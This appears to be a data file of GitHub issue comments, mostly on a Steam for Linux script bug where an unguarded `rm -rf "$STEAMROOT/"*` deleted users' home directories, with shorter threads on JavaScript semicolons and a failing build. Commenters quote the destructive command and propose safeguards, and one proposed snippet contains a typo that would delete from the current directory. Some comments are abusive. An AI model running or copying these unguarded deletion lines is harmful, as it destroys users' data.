6249	"""For verily I say unto you, Till heaven and earth pass, one jot or one tittle shall in no wise pass from the law, till all be fulfilled."" -Matthew 5:18
"
6250	"You should always use semicolons with curly-brace languages. 
"
6251	"```
        You don't have to put periods at the end.
                                At the end of sentences.
 But it can make them easier to read.

 On the other hand 
    there's no real reason not to
        just do whichever you want
```
"
6252	"Well, I just want to be part of this;
"
6253	"Yes, it certainly has become legendary;

On Tue, May 14, 2013 at 4:08 AM, Enrique notifications@github.com wrote:

> Well, I just want to be part of this;
> 
> —
> Reply to this email directly or view it on GitHubhttps://github.com/twitter/bootstrap/issues/3057#issuecomment-17867291
> .
"
6254	"Relevant: [We use semicolons everyday](http://www.youtube.com/watch?v=M94ii6MVilw)
"
6255	"""The only true law is that which leads to freedom"" (R.Bach)

Any style question starting with ""why don't you..."" has an easy answer: ""because this is my style"".

If you like semis, you use them; if you don't, you don't use them. What can be easier?
"
6256	"Vlad,

That would be perfectly true if this was just a style issue. And I'd be
100% behind you if that was the case. Unfortunately this is about much more
than styling. JavaScript needs the semicolons to function logically.
On 27 Jun 2013 06:02, ""Vlad Patryshev"" notifications@github.com wrote:

> ""The only true law is that which leads to freedom"" (R.Bach)
> 
> Any style question starting with ""why don't you..."" has an easy answer:
> ""because this is my style"".
> 
> If you like semis, you use them; if you don't, you don't use them. What
> can be easier?
> 
> —
> Reply to this email directly or view it on GitHubhttps://github.com/twitter/bootstrap/issues/3057#issuecomment-20083328
> .
"
6257	"There might be something else we want to focus on, leave the semicolons alone.

![semicolons](https://f.cloud.github.com/assets/37033/726371/55900c62-e0f0-11e2-9362-0e16266963ca.png)
"
6258	"Please use semicolons. Readbility is important. Maybe, you, @fat, know how and when using semicolon but it's not the case for all. Rookies, kiddies and even experts could need semicolon to read the code. So, please, add it for readability...
"
6259	"Why don't we just get rid of indentations too??? It's really `OPTIONAL`. And, also `MINIMALISTIC`.

All the current IDE's are doing it wrong. Either they should give diff background colors to the different scopes or show them `AII (AUTO INDENT INSERTED)`.
"
6260	"@0xABAB welcome to the scrooge community!  Good catch, would you like your first contribution to be helping us understand why it failed and fixing it?  Looking around at the logs, it looks like sbt can't find the main method anymore.  I think this would be a great way for you to join the community 😻
"
6261	"Uhm, if your software falls apart, you just have to hire more people, not beg for other people to fix your issues. 

I am more than capable of fixing any software issue, but that doesn't mean I have a high interest in fixing your software. 

I think it's a rather pathetic statement for a company like Twitter. It makes Twitter look weak. I wouldn't want to be associated with beggars. 
"
6262	"Hi @0xABAB, Twitter is a microblogging website, and open sources its tools because it wants to give back to the community.  We don't work for you, and we have limited bandwidth.  Demanding that we do something, or being rude will not help either of us.  While you're participating in the twitter open source community, please follow the Twitter [code of conduct](https://engineering.twitter.com/opensource/code-of-conduct).
"
6263	"@0xABAB I'm with you, some of us have lower tolerance for such shoddy work.  I can't unsee this now you pointed it out!

I installed the Stylebot chrome extension after you pointed out this problem, and the following script will hide this icon.  I realise you could have done this yourself, but we should share our small victories.

```
img[data-canonical-src=""https://travis-ci.org/twitter/scrooge.svg?branch=develop""] {
    display: none;
}
```

https://chrome.google.com/webstore/detail/stylebot/oiaejidbmkiecgbjeifoejpgmdaleoha/related?hl=en

I hope this helps, maybe @mosesn could agree at least update this thread after they _finally_ fix the build and then we can both remove this workaround.
"
6264	"> Twitter is a microblogging website, and open sources its tools because it wants to give back to the community.

Man, you are killing me. That's just hilarious. Twitter has a self-interest in getting more people to work with their code and tools; that is why it is open-sourced. Not because Twitter believes in some culture of sharing (it would have been a foundation, not a company in that case). It would be ""giving back"", if no contribution from the community had ever been done, because it was already perfect at release time. Any contribution back from the community, makes it a more symbiotic relation at first, but the very first bug fixed by the community is just pure profit. The very fact that I pointed out this issue, is something a PM would normally do; a PM you would normally have to pay. 

>  Demanding that we do something, or being rude will not help either of us.

I don't demand anything. I just say which work needs to be done. Who actually does it is of no concern to me. I have my reasons for opening issues in projects I am considering to use. Whether or not it actually gets fixed is hardly of interest to me. What is important is the amount of drama involved. In this case the drama is so high (perhaps you are micro-blogging all day long, which makes you good at drama, but made you forget about your job). That would be a reason for me (and hopefully others) to never start using this software in the first place (which is, of course, the direct opposite of your corporate goals). Isn't this multi-agent game called ""open-source""-development fun?  

> While you're participating in the twitter open source community, please follow the Twitter code of conduct.

Oh man, you really lack any kind of social insight, right? I also believe you don't know the meaning of the word ""community"".     

@yschimke I have little interest in stylistic improvements, but I do appreciate your efforts (with the exception of your voting bullshit). 

As far as the rest of these clowns down voting, please grow a spine. 

@TwitterHQ: please hire some more competent people next time. These people are destroying your brand (or whatever is left of it). 
"
6265	"The build passes, so I'm going to mark this as fixed.
"
6266	"It's actually failing again. https://travis-ci.org/twitter/scrooge/builds
"
6267	"The build has been passing pretty consistently: https://travis-ci.org/twitter/scrooge/builds
"
6268	"I am impressed how calm you stay about this. This is terrible. I just lost my home directory. All i did was start steam.sh with STEAM_DEBUG=1. I will investigate this and report back.

edit1: I suspect steam.sh got some bugs(does not check own variables) and when it tried to do scary things it crapped himself.
Line 468: rm -rf ""$STEAMROOT/""*

edit2: It gets better. Seems on windows Steam is overeager too! https://support.steampowered.com/kb_article.php?ref=9609-OBMP-2526 (The warning part is interesting. Because everybody reads this before uninstalling...)
"
6269	"I agree, that line minimally requires an exists and not null check for $STEAMROOT
"
6270	"#scary!

As an ex programmer, that really makes me chuckle. Can I at least get an apology from whoever committed that comment without adding a fix? 
"
6271	"This also happened to me a few weeks ago, my entire home was deleted by the steam.sh script.
"
6272	"introduced here Sep 10, 2013 https://github.com/indrora/steam_latest/commit/21cc14158c171f5912b04b83abf41205eb804b31 line 359

`rm -rf ""$STEAMROOT/""*` could be evaluated as `rm -rf ""/""*` if `$STEAMROOT` is empty

but what exactly caused this?  i've symlinked ~/.local/share/steam to, so i am a bit afraid to start steam :/
"
6273	"pythoneer, 

I believe the issue starts on line 19:

```
# figure out the absolute path to the script being run a bit
# non-obvious, the ${0%/*} pulls the path out of $0, cd's into the
# specified directory, then uses $PWD to figure out where that
# directory lives - and all this in a subshell, so we don't affect
# $PWD

STEAMROOT=""$(cd ""${0%/*}"" && echo $PWD)""
STEAMDATA=""$STEAMROOT""
```

This probably returns as empty which mean: `rm -rf ""$STEAMROOT/""*` is the same ass `rm -rf ""/""*`.
"
6274	"TcM1911, 

that's my guess, too.
"
6275	"@keyvin @d00fy :
Line proceeded by `# Scary!` comment is in `reset_steam()` function, which is executed if and only if `steam.sh` is invoked with `--reset` as first argument.

Did any of you deliberately invoked that script with that option? If yes, why did you do it? What were you trying to achieve?

Removing user data is obviously wrong, no doubt about it. But if this happens only when user requests certain action, scope of that issue is somewhat limited.
"
6276	"Yeah, they kinda need a readlink in there.

```
STEAMROOT=$(readlink -nf ""${0%/*}"")
```
"
6277	"@Minio Not ""only if"".  `reset_steam` is also invoked by removing your `.steam` directory, since that sets `INITIAL_LAUNCH`
"
6278	"@Minio A script accidentally running `rm -rf /*` is unacceptable in any scenario.
"
6279	"it is like bumblebee all over again!
https://github.com/MrMEEE/bumblebee-Old-and-abbandoned/issues/123
"
6280	"I encountered Steam behaviour like with «--reset» for several times:
when I added «--reset» AND when I didn't. So — not «only if», can
confirm this, even having not deleted ~/.steam/ dir, too.
"
6281	"wonder what the code path is to hit that rm without --reset
"
6282	"Can confirm; I have Steam bounded in an SELinux context (""Steam"") and SELinux spits out:

`Context violation: process  /home/indrora/.local/share/Steam/ubuntu12_32/steam is only allowed in context steam_context, attempted to remove /boot/efi/grub/efistub`

Ooops. I'll write a patch and PR it :beer: 
"
6283	"https://github.com/lrusak/steam_latest/pull/1 PR
"
6284	"Does anybody have reliable repro steps for this? I can easily add the checks for STEAMROOT being empty, but I would also like to fix the root cause if possible.
"
6285	"It will definitely fail if you run steam.sh as `bash steam.sh`. I don't know if that's the cause in this case. In terms of root cause, I would say you should use `set -e`, `set -u`, and similar options in order to make the script less likely to silently ignore errors.
"
6286	"Using `${STEAMROOT:?}` instead of `$STEAMROOT` would have helped, too.

(For those not familiar, `${FOO:?}` is identical to `$FOO` except that it errors out automatically if `$FOO` is empty or unset.)
"
6287	"Which is the same thing that would have happened had the unnecessary '/*' not been there anyway, it would have errored out. Its not necessary because the rm was set to recursive already...

```
if [ ! -z ""${STEAMROOT}"" ]; then
   rm -rf ""${STEAMROOT}""
fi
```
"
6288	"Here is a patch which enables `set -e`, `set -u`, and a few others, and then fixes up all the places where undefined variables are expected to be (as far as I can tell): https://gist.github.com/rcxdude/1f6257e0a965147a462c
"
6289	"@rcxdude Come on. We are on github here. Do that in a PR please! Do not post whole patch files into issues... :-1: 
"
6290	"@mablae There is no code on this repo, there is nothing to send in a PR against. A gist wouldn't have gone astray though :smile:
"
6291	"@rcxdude: Please link to a Gist.
"
6292	"@mablae How about instead of being a jerk, you link @rcxdude to some documentation.
"
6293	"@johnv-valve regardless of tracking down the cause of this, this rm line must be protected from future accidental gremlins due to the severity of the fail scenario.
"
6294	"@dannyfallon Oh, sorry then... 
@sdt16 I am sorry. Thought the code was on this repo ... Didn't wanted to be a ""jerk"" :)
"
6295	"Does it happen only if you move ~/.local/share/steam ? #scary! :s
"
6296	"The idiomatic way to do this in Bash is to use default variables as in ,`""${var:-/sane/path}""` or `""${var:?}""` as was already mentioned. While using `set -u` or similar could have prevented this mistake, it's lazy and considered bad style.
"
6297	"If steam really wants to act like a package manager it should only delete files created by itself.

@soren121 +1
"
6298	"Shell scripts can also have tests, see [shunit2](http://shunit2.googlecode.com/svn/trunk/source/2.1/doc/shunit2.html). I wish I used it instead of making mini/naive one myself.
"
6299	"it's 2015; I think we can do better than complex badly written shell scripts.

> rm is dangerous; you should never use rm ${macro}/ 
"
6300	"@d00fy Steam is essentially a package manager for your games.
"
6301	"@ju2wheels your snippet has a spurious 'D' in it, 'STEAMROOT' versus 'STEAMDROOT' -- so ${STEAMDROOT} will be empty and that code is going to end up starting at the current directory and doing a recursive delete from there.

Could be almost as bad depending what the current directory is. Let's hope nobody copy/pastes that snippet for actual use.
"
6302	"@mpnordland I think that's what he said.
"
6303	"Is this the new [bumblebee](https://github.com/MrMEEE/bumblebee-Old-and-abbandoned/commit/a047be85247755cdbe0acce6f1dafc8beb84f2ac)?
"
6304	"I hope no one is running this as root
"
6305	"@d00fy I'm going to make the argument that while Steam is certainly at fault, you should definitely be using off site backups for this exact reason.
"
6306	"> I hope no one is running this as root

On a typical desktop Linux system that would only make it marginally worse - reinstalling the OS is less of a problem than losing all  your data from $HOME
"
6307	"@john-valve You are more than welcome to any log files that a data recovery service can get from the drive, as long as you give me a copy of everything. I do not have a large drive to undelete to, so the data that wasn't in the cloud is. Mad props for #Scary though 

@nicatronTg Yes, I should need to have a complete back up rotation of dailies, four weeklies, and 12 monthlies so that I can feel safe and secure running steam for linux. 
"
6308	"@DanielGibson Sure, as long as you didn't mount other partitions rw somewhere else
"
6309	"@carlosmcevilly even if they did it would be better than the existing code thats there ;-) , it will just fail and not take the world with it. But.... but... i fixed my typo ;-) , thx.
"
6310	"Hmm.. when I was copying .steam from an older installation to a newer installation of Kubuntu, I saw in stdout messages like ""running rm -rf <some directory>"" when I was running it (after the `rm -rf` it installed Steam again with the 200MB download). Though of course I didn't lose any data.

@keyvin This is somewhat OT but to recovery your data, immediately stop using the external drive and run something like PhotoRec or TestDisk or if the drive has important files you can even use a program like ddrescue to copy the drive. If you haven't used the drive since the data loss then most of your data should be recoverable.
"
6311	"Note there is also protection against this within GNU rm itself. I.E. this would have protected the / dir at least:

```
rm -rf ""$STEAMROOT/"" && mkdir ""$STEAMROOT""
```

But it's best leave out the / in any case as it's redundant

```
rm -rf ""$STEAMROOT"" && mkdir ""$STEAMROOT""
```
"
6312	"Bash-isms are the problem here:

```
(cd `dirname $0`; STEAMROOT=`pwd`)
```

If `dirname` and `pwd` aren't in your ""`$PATH`"" then fuck you.
"
6313	"https://github.com/sindresorhus/guides/blob/master/how-not-to-rm-yourself.md#safeguard-rm
"
6314	"My condolences, @keyvin. I lost all my data like this in 1998 due to a SuSE Linux installation script having exactly this bug in it as well. Back then I lost my Linux, my Windows, and all my data and I only learned what backups are really for from that incident... 
"
6315	"@TcM1911 Determining the path of the script being invoked, in a fully _portable_ (w.r.t. platforms) and completely reliable manner, even in the face of symlinks, is a tricky problem and all too easy to get wrong. The only bullet proof way of doing it, of which I'm aware, is provided below (assumes bash); could be prepended to any script needing this functionality.

``` script
#!/bin/bash

script_path () {
    local scr_path=""""
    local dir_path=""""
    local sym_path=""""
    # get (in a portable manner) the absolute path of the current script
    scr_path=$(cd -P -- ""$(dirname -- ""$0"")"" && pwd -P) && scr_path=$scr_path/$(basename -- ""$0"")
    # if the path is a symlink resolve it recursively
    while [ -h $scr_path ]; do
        # 1) cd to directory of the symlink
        # 2) cd to the directory of where the symlink points
        # 3) get the pwd
        # 4) append the basename
        dir_path=$(dirname -- ""$scr_path"")
        sym_path=$(readlink $scr_path)
        scr_path=$(cd $dir_path && cd $(dirname -- ""$sym_path"") && pwd)/$(basename -- ""$sym_path"")
    done
    echo $scr_path
}

script_dir=$(dirname -- ""$(script_path)"")
```
"
6316	"@sindresorhus I'd disagree with using trash instead of rm because having to rely on node just adds complexity to systems that wouldn't otherwise need node.

It's also worth mentioning that most of the linux distros I've used recently have the --preserve-root flag already available...
"
6317	"> I'd disagree with using trash instead of rm because having to rely on node just adds complexity to systems that wouldn't otherwise need node.

I know people disagree with that. That's fine. I was linking to the [`safeguard rm`](https://github.com/sindresorhus/guides/blob/master/how-not-to-rm-yourself.md#safeguard-rm) section.
"
6318	"I've moved my directory and symlinked it too, and I've thankfully not had such issues before. Regardless, as someone mentioned before, I'd strongly suggest adding test cases against such major bugs.
"
6319	"This big companies are so in the need of engineers that would even hire my grandma, and then shit happens.
"
6320	"In this context, how can i remove steam from my Linux without using steam?
"
6321	"As @d00fy said, it's amazing how calm you were about this, @keyvin. A great bug report it was too. Embarrassing as bugs like these are, it's a lot easier to take it on with reports like this one.

As others have pointed out too, this is an excellent bug for advocating using some BASH-strictness, I like to use this:

```
set -euo pipefail
```

This bug is also a good case for advocating TDD with shunit2. Make the steam script modular so that parts of it can be (unit) tested, write a test for this bug which fails and then fix it. We all do this in other ""real"" programming languages and there's no reason why we can't do this in BASH too. Hooking it up with CI servers like Jenkins is no problem either.
"
6322	"Tangentially related:

I assume all the people that moved this folder are running out of disk space/want to stuff the files elsewhere. Like myself. This is what I did on Windows just a couple days ago, I'd hope that Steam on Linux supports the same (hidden) option: http://www.rockpapershotgun.com/2012/09/11/finally-an-in-built-way-to-choose-steam-install-locations/

Basically:
- Close Steam
- Run steam -dev
- Click on the new 'Console' tab
- Enter 'install_folder_ui' (you even get tab completion)
- Add a new path, say .. /media/steam
- Close steam, restart without -dev

Now you can pick the location during installation (""This game? Install to my SSD. That? Ah, large slow disk is fine""). You can also move games between locations (from $path1/SteamApps/common to $path2/SteamApps/common and that will 'just work' in nearly all cases).

So, maybe Valve should make that more accessible in the UI, bypassing the need of users to mess with the default install path?
"
6323	"Thanks for reminding me to always check shell scripts before executing them
"
6324	"@darklajid changing the destination can already be done without using -dev, console, and install_folder_ui.

steam -> settings -> downloads -> steam library folders
"
6325	"@synapse84 Whoa - and here I kept that bookmark around, treasuring my knowledge of hidden options. :) Thanks a lot!
"
6326	"Amazingly scary.
"
6327	"Stupidest bug I've seen in years.
"
6328	"git blame on that, who did the commit?

Valve is retarded on so many levels, they completely screw up how libraries are linked up in some vain attempt to make Linux a kind of Ubuntu ABI stable distro. Now this.. The fact that steam is not using chroot and Linux kernel namespace support to protect against buggy/nefarious applications is idiotic security practice.

Further, what is Valve doing for a proper review and audit system for patchsets and continues integration, github comments, is that it.. F\* may as well write software via Stasi-book (Facebook) wall posts lol..
"
6329	"I just wanted, on behalf of whole internet, to tell that the whole world could learn a thing or two from you 
@keyvin.
The ""tone"" used to describe the issue is informative and polite, raging, straight to the point.
well done!

:beers: 
"
6330	"Classic Daily WTF: http://thedailywtf.com/articles/Bourne-Into-Oblivion
"
6331	"This is Bumblebee all over again.
"
6332	"Dear Valve Software,

this is one of the greatest fails I've seen in a long while, only compared to the #GotoFail issue.
Please think it twice to hire competent people.

Thanks.
"
6333	"@stryju Part of being a programmer now is being deluged in a sea of github repositories pretending that the software contained within works. Only after actually trying to use these projects, maybe even to the point where you start relying on them, do you realise half are garbage. After twenty or so such disappointments it's only natural then to remain calm in the face of yet another software project failure.
"
6334	"@xtraeme Mistakes happen, doesn't matter if you're competent or not. 
"
6335	"@nuisanceofcats while this might be true, I'm still impressed how calm and polite @keyvin remained.
I went through **a fair share**of github issues and this one caught my eye :smile: 
"
6336	"@Bumrang if you are executing `rm -rf $VAR/*` it's mandatory to check if the var is set! that's clearly incompetence.
"
6337	"@Bumrang You got this open source thing all wrong. There is no room for civil or mature feedback. You should try emulate Linus like @xtraeme is doing and be abusive to anybody whose work displeases you. Because clearly people don't make mistakes, their work is an embodyment of who they are. You either are good developer or your not, there is no growth.
"
6338	"@stryju Yeah you're right he is pretty calm, I think we should worship him as the new Buddha. @keyvin Have you always been so cool and collected, can you share your secrets with us? If someone wiped my system I'd be like, nowhere near as cool as you.
"
6339	"> While using set -u or similar could have prevented this mistake, it's lazy and considered bad style.

It may not a good idea to knowingly write code that relies on `set -u`, but it helps prevent accidents exactly like the one this thread is about. It doesn't break any sane code. Turning it on is opting into some much-needed sanity checks.
"
6340	"@nuisanceofcats exactly! :beers: 
"
6341	"Seriously, though... lets try to keep things civil.  There can be any of a bunch of reasons for this having slipped by.  It's especially obvious with how Valve works (joining and leaving projects almost at whim).  The code could have been put in place by someone who's not even at Valve any more and folks picking it up just went with it because it was working.  It's something that you could easily miss if you're not looking for it and didn't experience an issue with it.  Anyone using Steam for Linux and following best practices and inspecting scripts before running them could have found this bug ages ago (myself included; I'm not saying I'm not equally to blame).

Think about how long it took for this to get a ticket.  Everybody missed it for over a year.
"
6342	"@skybert `set -e` and `set -u` are recognized as poor coding practice. From bash-hackers.org:

> set -e causes untested non-zero exit statuses to be fatal. It is a debugging feature intended for use only during development and should not be used in production code, especially init scripts and other high-availability scripts. Do not be tempted to think of this as ""error handling""; it's not, it's just a way to find the place you've forgotten to put error handling. Think of it as akin to ""use strict"" in Perl or ""throws"" in C++: tough love that makes you write better code. Many guides recommend avoiding it entirely because of the apparently-complex rules for when non-zero statuses cause the script to abort. Conversely, large software projects with experienced coders may recommend or even mandate its use. Because it provides no notification of the location of the error, it's more useful combined with set -x or the DEBUG trap and other Bash debug features, and both flags are normally better set on the command line rather than within the script itself. Most of this also applies to the ERR trap, though I've seen it used in a few places in shells that lack pipefail or PIPESTATUS. The ERR trap is not POSIX, while set -e is. failglob is another Bash feature that falls into this category (mainly useful for debugging). The set -e feature generates more questions and false bug reports on the Bash mailing list than all other features combined! Please do not rely upon set -e for logic in scripts. If you still refuse to take this advice, make sure you understand exactly how it works. See: Why doesn't set -e (or set -o errexit, or trap ERR) do what I expected? and http://www.fvue.nl/wiki/Bash:_Error_handling
"
6343	"Correct me if I'm wrong, but AFAIK ""$0"" expands to the **name** the script has been invoked as, **not the absolute path**.   (open a shell and try echo $0)
I guess this adds to the problem of not checking for unset variables...

$0 is useful for programs like busybox, that act differently depending on by what name they have been called.

Using it for filepath-magic OTOH opens yet another can of worms, as soon as there are symlinks involved:  The regex can expand to a path that doesn't necessarily exist.

**tl;dr:** don't use $0 in paths.
"
6344	"@markgraf: $0 is the command the script was called with, for example emacs, or /usr/bin/emacs, or ../../bin/emacs. It's really just the first ""word"" of the command line. If you just want the name of the executable, use basename $0, if you want the full path, use readlink -f $0 (edit: except if $0 is a symlink, then readlink -f will return the full path to the symlink target).
"
6345	"actually $0 can be anything or nothing at all. See help exec in bash.
"
6346	"Everything is impermanent and transient. Especially bits on disk. No use crying over flipped bits.  

I also don't want to get angry about it because steam for linux was a counter-thrust agaisnt microsoft turning windows into a walled garden with the app store. I didn't pay for steam for linux, and I appreciate that Valve is taking the time to make a proper port so we aren't all stuck running steam through wine. 

If my root directory had to be sacrificed to appease the god of bugs, so be it. It'd be cool if I could get a special badge and an email apology from whoever added the #Scary! comment. That still makes me chuckle. 
"
6347	"Came across a similar problem a few weeks ago when Steam started deleting files for unclear reasons; I killed the process as soon as I saw that. I first thought it was in its own dir, as I discovered that some games had been uninstalled but the maths didn't really add up. Now that I see this issue, I really wonder if I have lost important stuff (like backups of my work). I sure hope not but I'm pretty scared now.

Anyway, I haven't really understood from the long list of previous comments: is the issue fixed or not?
"
6348	"@markgraf, no not always, as it depends on invocation.
jordi@penyagolosa:~$ cat /tmp/meh
#!/bin/sh

echo ""This is \$0: $0""
echo ""This is basename \$0: $(basename $0)""

jordi@penyagolosa:~$ /tmp/meh 
This is $0: /tmp/meh
This is basename $0: meh
"
6349	"This is platinum.
"
6350	"Priceless...
"
6351	"comment before it goes hot.
"
6352	"Wow.
I think it is time to move Steam to a separate user and/or chroot, just in case.
"
6353	"@Korobochka I think that its best to do that for all games.  I also only run Skype from a Windows VirtualBox.  Its hardly as secure as Qubes but I think that proprietary apps that do a lot of stuff should be isolated in at least some minor way.
"
6354	"This issue has been open for 2 days without any response, fix, or apology from Valve? What the actual f**k?
"
6355	"Fire in the hole
"
6356	"It's like Sierra Half-Life 1 installer all over again. The installer had a default target of C:\Sierra\Half-Life. If you changed this to C:\Games\Half-Life and later you uninstalled Half-Life 1, the uninstaller removed C:\Games completely. Great achievement for Valve to bring such behavior back.

Just a hint: Did you ever check the amazing quality and documentation of Valve's Linux dedicated servers? It is horrific, I spent so many hours debugging this stuff.

Oh by the way: Valve is an US company deploying an automatic software installer onto your free software operating system. Would also be a great place for NSA to access your system.
"
6357	"@stratumnine As far as we know this has only affected one person and that person is chill about it. There's no need to get aggressive on behalf of these hypothetical people who it also messed up. You should learn from @keyvin, chillest brother alive.

Remember kids, before you rage in github think: ""What would @keyvin do.""

Praise be to lord keyvin.

PS Valve should provide offerings to keyvin.
"
6358	"This might become even worst than [bumblebee](https://github.com/MrMEEE/bumblebee-Old-and-abbandoned/commit/a047be85247755cdbe0acce6f1dafc8beb84f2ac)... it can potentially erase any network volume that you have mounted at your filesystem. Imagine if you have your NAS drive mounted...
"
6359	"@nuisanceofcats no this happened to other people, too e.g. @onodera-punpun, @d00fy and other people reporting this on reddit r/linux 

but nonetheless you are right about the tone especially these ""w00t"" ppl posting stupid pictures and posting nothing than bumblebee references which helped no one cuz there are so kewl. 
"
6360	"@nuisanceofcats It has not affected one person, read the second comment for instance. I myself might have been affected by this as well. I lost tons of files for no apparent reason a couple of days ago. I am still investigating what happened and just found out about this.
"
6361	"I need to comment on this, because of yes. I use steam and omg!

Thanks for report this ""scary bug""
"
6362	"Another genius.
"
6363	"Github is not a forum, if your comment is not related to the technical issue please stop posing and take it here: http://www.reddit.com/r/linux/comments/2sjjr3/warning_to_steam_users_dont_try_to_move_your/
"
6364	"> but nonetheless you are right about the tone especially these ""w00t"" ppl posting stupid pictures and posting nothing than bumblebee references which helped no one cuz there are so kewl. 

@pythoneer Yes, I'm kewl, what's your problem?

Bumblebee and this are not just bugs, they are gems. You can reference them in beginner's books where you say ""don't do this, because that's what happens"". I see nothing wrong with having some fun about it, especially if that causes people to remember it better.
"
6365	"I am doing exactly the same except that instead of using the Steam root folder as symlink, I use ~/.local/share/Steam/SteapApps and nothing got removed after the upgrade. 
"
6366	"I think we should consider what @keyvin (praise be) would want before making any more comments on this bug. nuisanceofcats - first order keyvinite
"
6367	"@alexander-yakushev for fun posts and showing others how kewl you are pls visit other places like @ju2wheels mentioned. If you like to help in a serious way e.g. sharing experiences with this bug or reproducible behavior, feel free to post everything you know about. but this style of post is not helping but  complicates to read through the post for ppl. who work with this information to track down and solve the problem.    
"
6368	"@ju2wheels That code would seem to fix it. I don't see why a \* was added to the rm command. If it wasn't there it would at least have errored out and preserved the files for those in OP's position.

On the other hand, the check should be made for the entire set of reset commands.
"
6369	"I would rather not have Steam installed until this is fixed. Is there an official procedure to uninstall Steam manually under Linux, [like there is for Windows](https://support.steampowered.com/kb_article.php?ref=9609-OBMP-2526)?
"
6370	"I'll just mention [safe-rm](https://launchpad.net/safe-rm) - that's what I found after searching for a possibility to avoid such misfortune in vendor shell scripts altogether. It's a wrapper for /bin/rm that checks the given path against global and user specific blacklists. Sounds like a good way to tackle the problem at its root.
"
6371	"To those to believe its appropriate for software to fail today in this way, after literally decades of research into type-systems, test frameworks, fuzz testing, etc.. and so this is nothing short of brain damaged.

I don't even see an urgent advisory being pushed from Valve two days. So not only is this poor software, it's poor implementation of the development life-cycle and utterly egregious policy both technical and non-technical.

We need to seriously move away from this attitude of expecting software to catastrophically fail as if that's somehow acceptable. I realise the issue of complexity, hell even two uint64_t has more states than atoms of this planet, however we have very sophisticated tools and policy to mitigate or outright solve many of this idiotic issues that seem to keep coming up.

Less the technical side, we need to move away from this attitude of letting technical companies steal, spy and delete our data without any kind of recourse. It's ridiculous, Google for example is now pushing zero-day exploits since Microsoft was so negligent in acting to fix its security issues. Similar stories for Apple. I see no clear security and advisory information for this software at all. I also see this software not following best practices in modern security either, at all.

Good programmers think about algorithms (i.e. check the thing your about to delete, Jesus); Great programmers think about type-systems and the Curry Howard correspondence; Fantastic systems engineers think about all these aspects and policy to cover non-technical issues also.

Maybe Steam should be using less hard coded shell script which is completely shell dependent and start using high-level tools to do things directly. Shell script is really for short jobs that happen one or two times, they are not really for production grade software in its general mode of operation. Even build systems such as CMake, SCons, Cabal, etc..learnt shell script sucks in generality long ago!
"
6372	"@kkriehl - safe-rm would probably save us here. Since we're calling `rm -rf /*` the shell globs it up and rm gets the arguments `( /boot /etc /dev /home /usr ... )` and as such isn't protected. `rm` as it stands has protection against `rm -rf /` -- you **have** to pass it `--no-preserve-root` if you're going to do that.

Problem is, that's _another_ dependency. Unless VALVe includes the wrapper statically.
"
6373	"Apple had a similar issue with an iTunes installer about ten years ago - if your disk name included a space, it would fry your iTunes.  Same problem - bash expansion issues.

bash is not a good tool for this purpose.  EIther have people audit each line of the bash scripts, or write it in a high-level language and include a lot of checking still...
"
6374	"Suggestion: 
1.) Don't use bash, C is more than capable of handling this functionality. And you remove a dependency ( bash is now a security risk ). 
2.) And even more so, it might be prudent to NOT delete anything, and just create a new directory with a uuid/timestamp and change a symlink. I think anyone using linux can write their own cleanup script if they feel the need.
"
6375	"For those of you saying Valve didn't respond to this yet, I suggest you search this bug for johnv-valve and MrSchism.

Incidentally, it's also just before 8am PST (Valve's timezone), so chances are none of the Valve developers are currently at work or even looking at this thread at the moment.  Or have for the past 16 or so hours.
"
6376	"oh my what a bug. 
"
6377	"Shouldn't ""As a user I want to move my Steam folder to another media."" be a regularly tested user story? Games are big and SSDs are small, so this should be quite common.
"
6378	"@Indrora You're right and I maybe should have mentioned that I don't think safe-rm would be an adequate solution. Not at all. But I think it is mentionable as a possible general precaution to avoid loosing data because of careless scripts for worried visitors like myself ;)
"
6379	"I'm seriously asking myself more and more why I would use steam. Why didn't you consider to at least have a ""- d"" check before each removal? I mean, STEAMDATALINK is also empty. WTF, dudes. WTF. This is seriously a problem for my system and will be put into a chroot by me from now on.

![steam.sh source](http://i.imgur.com/Qb7B3RL.png)
"
6380	"Well this is interesting...
"
6381	"> https://github.com/lrusak/steam_latest/commit/21cc14158c171f5912b04b83abf41205eb804b31

Is now 404'd. What a cowardly move.
"
6382	"```
rm -rf $dir/*
```

is just a stupid and dangerous way to do:

```
rm -rf $dir/
```

Only the former will preserve dot files (or not, depending on shell options, shell interactivity etc.)
"
6383	"I was stung by this bug two days ago.
Good thing I manually installed steam in a semi-isolated way, under a very unpreveleged user. So hardly anything of value was lost.
"
6384	"@Xaekai - I forked the repo before it died, plus patched the problem in some places: https://github.com/indrora/steam_latest/commit/e0686814c0dca462007b6343c763483071dba591
"
6385	"`readlink` is not reliable, it is not part of the POSIX essentials (but part of Debian's coreutils). I remember that it used to be in the LaTeX package on my old SuSE.

---

You can't set variables in subshells: (@seanchannel)
$ a=1;(a=2); echo ""$a""
1
Your example should be
foo=""`(cd  ""${0%/*}"" && pwd)`""

---

Also $0 is not directly affected by argv[0]:
$ cat foo.sh
#!/bin/sh
echo '$0: '""$0""', $1: '""$1""
/usr/bin/dirname ""$0""

$ sh -c './foo.sh ""$@""' whatever second
$0: ./foo.sh, $1: second
.

$ sh -c './foo.nothere ""$@""' whatever second
whatever: 1: whatever: ./foo.nothere: not found

---

Yet another problem:
$ cat bar.sh
set -x
foo=""`(cd  ""${0%/*}"" && pwd)`""
cd /
ls -l ""$foo""

$ ll /proc/self/cwd
lrwxrwxrwx 1 7eggert 7eggert 0 Jan 16 19:01 /proc/self/cwd -> /tmp

$ busybox sh /proc/self/cwd/bar.sh 
- cd /proc/self/cwd
- pwd
- foo=/proc/self/cwd
- cd /
- ls -l /proc/self/cwd
  lrwxrwxrwx    1 7eggert  7eggert          0 Jan 16 19:01 /proc/self/cwd -> /

---
- You should set LC_ALL=C, just to be sure, if you parse the output of programs.
- Never omit """" around ""$var"" unless you explicitly triple-checked.
- Programs should, if possible, be installed on a system location. This can be done using a separate ""sys_steam"" account and having a suid application owned by user ""sys_steam"" doing the install/uninstall in /opt/steam/... .
- It's acceptable to have a fixed directory in the header of a start script. Inexperienced users won't change the location, experienced users will change the script. My ¢¢
"
6386	"`~/.local/share/Steam` is a symlink here too, so I'm not overly happy if it's a precondition for getting bitten by this. When are these sanity issues in the script going to be fixed so that we can actually safely run steam?

For now I commented out the `rm -rf ""$STEAMROOT/""*`line and did `chattr +i ~/.steam/steam/steam.sh` to prevent steam from modifying it.
"
6387	"If you need a lot of shell scripting... hire someone who knows shell scripting.
"
6388	"@keyvin I have managed to reproduce this, can you tell me if this might describe what happened on your machine?

copy ~/.local/share/Steam to an NTFS drive.
